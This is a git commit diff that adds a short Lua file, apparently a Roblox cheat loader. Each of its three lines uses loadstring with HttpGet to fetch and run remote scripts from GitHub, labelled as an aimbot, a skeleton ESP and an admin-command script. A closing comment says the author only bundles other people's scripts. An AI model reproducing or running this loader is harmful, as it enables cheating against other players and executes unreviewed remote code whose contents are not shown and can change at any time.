9d79cd76a7921deecb4b0e8e35ac49ca51af3c18
monkey <165171520+itsmonkeyz@users.noreply.github.com>
2024-11-22 05:26:22 +0200

    Create KismetSkripts.lua

---
+++ KismetSkripts.lua
@@ -0,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))() -- aimbot script
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/refs/heads/main/SkeletonESP.lua"))() -- skeleton esp script
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() --admin script
+
+-- ALL OF THE FOLLOWING SCRIPTS ARE NOT MINE, THIS IS SIMPLY A CONFIG TO LOAD ALL OF THEM AT THE SAME TIME!!! nothing special :0
